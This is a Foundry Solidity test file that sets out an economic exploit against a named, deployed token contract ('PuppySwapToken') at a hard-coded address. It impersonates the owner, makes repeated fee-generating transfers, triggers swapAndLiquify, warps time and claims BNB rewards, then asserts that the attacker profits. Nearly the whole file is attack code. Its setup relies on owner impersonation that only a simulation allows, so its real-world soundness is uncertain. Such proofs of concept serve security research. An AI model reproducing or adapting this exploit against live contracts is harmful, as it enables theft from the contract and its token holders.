pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface PuppySwapToken {
    function owner() external view returns (address);
    function pancakePair() external view returns (address);
    function activateContract() external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function swapAndLiquifyEnabled() external view returns (bool);
    function nextAvailableClaimDate(address account) external view returns (uint256);
    function claimBNBReward() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xeFfAb18108124C2b6280C62abA70a03c79cc4327;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label addresses for clarity
        vm.label(TARGET, "PuppySwapToken");
        vm.label(attacker, "Attacker");

        // Get the owner address from the contract
        PuppySwapToken puppy = PuppySwapToken(TARGET);
        address owner = puppy.owner();
        vm.label(owner, "Owner");

        // Get pancake pair address
        address pancakePair = puppy.pancakePair();
        vm.label(pancakePair, "PancakePair");

        // Impersonate owner to activate contract
        vm.startPrank(owner);
        puppy.activateContract();
        vm.stopPrank();

        // Give attacker some initial PUPPY tokens to work with
        // Get some from owner by impersonating
        vm.startPrank(owner);
        // Transfer some tokens to attacker (owner is excluded from fees)
        uint256 initialTokens = puppy.balanceOf(owner) / 100; // 1% of owner's balance
        puppy.transfer(attacker, initialTokens);
        vm.stopPrank();

        // Give attacker some BNB for gas and potential transfers
        deal(attacker, 10 ether);

        // Also need to give contract some BNB for the swap to work
        // The contract needs BNB balance for the swap to receive BNB
        deal(TARGET, 5 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        PuppySwapToken puppy = PuppySwapToken(TARGET);
        address pancakePair = puppy.pancakePair();

        // Record initial BNB balance of attacker
        uint256 initialAttackerBalance = address(attacker).balance;

        // First, we need to build up contract's token balance from fees
        // The contract accumulates tokens via liquidity fee (8%) and tax fee (2%)
        // We need contract balance >= minTokenNumberToSell
        // Let's check current contract balance
        uint256 contractTokenBalance = puppy.balanceOf(TARGET);
        // minTokenNumberToSell is not public, but we know it's _tTotal.mul(1).div(10000).div(10)
        // _tTotal = 1000000000 * 10**6 * 10**9 = 10**24
        // minTokenNumberToSell = 10**24 * 1 / 10000 / 10 = 10**19
        uint256 minTokenNumberToSell = 10**19;
        console.log("Contract token balance:", contractTokenBalance);
        console.log("Min tokens to sell:", minTokenNumberToSell);

        // If contract doesn't have enough tokens, we need to generate fees
        // by making transfers (not to/from pair, and not from contract to pair)
        if (contractTokenBalance < minTokenNumberToSell) {
            // Create a dummy address to transfer to/from
            address dummy = address(0x123);

            // Get attacker's token balance
            uint256 attackerBalance = puppy.balanceOf(attacker);

            // We need to make transfers that incur fees
            // Transfer from attacker to dummy (will incur 10% total fee)
            // Need to ensure we're not hitting maxTxAmount
            uint256 transferAmount = attackerBalance / 20; // Use 5% to be safe

            // Make several transfers to accumulate fees in contract
            for (uint i = 0; i < 10; i++) {
                puppy.transfer(dummy, transferAmount);
                // Transfer back to attacker (dummy needs tokens)
                // Actually, just keep transferring to new addresses to accumulate fees
                dummy = address(uint160(dummy) + 1);
            }
        }

        // Check contract balance again
        contractTokenBalance = puppy.balanceOf(TARGET);
        console.log("Contract token balance after fee generation:", contractTokenBalance);

        // Ensure swapAndLiquify is enabled
        require(puppy.swapAndLiquifyEnabled(), "swapAndLiquify not enabled");

        // Now trigger swapAndLiquify by making a transfer
        // The transfer must not be from pancakePair
        // Let's transfer from attacker to a new address
        address recipient = address(0x456);
        uint256 triggerAmount = 1000; // Small amount just to trigger

        console.log("Making transfer to trigger swapAndLiquify...");
        puppy.transfer(recipient, triggerAmount);

        // Wait a bit for any state changes
        vm.roll(block.number + 1);

        // Now check if we can claim BNB reward
        // First, check if we have a next claim date
        uint256 nextClaim = puppy.nextAvailableClaimDate(attacker);
        console.log("Next claim date:", nextClaim);
        console.log("Current timestamp:", block.timestamp);

        // If we need to wait, warp time
        if (nextClaim > block.timestamp) {
            vm.warp(nextClaim);
        }

        // Claim BNB reward
        console.log("Claiming BNB reward...");
        puppy.claimBNBReward();

        // Check final balance
        uint256 finalAttackerBalance = address(attacker).balance;
        console.log("Initial attacker BNB balance:", initialAttackerBalance);
        console.log("Final attacker BNB balance:", finalAttackerBalance);
        console.log("Profit:", finalAttackerBalance - initialAttackerBalance);

        // Verify profit
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker should have profit");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

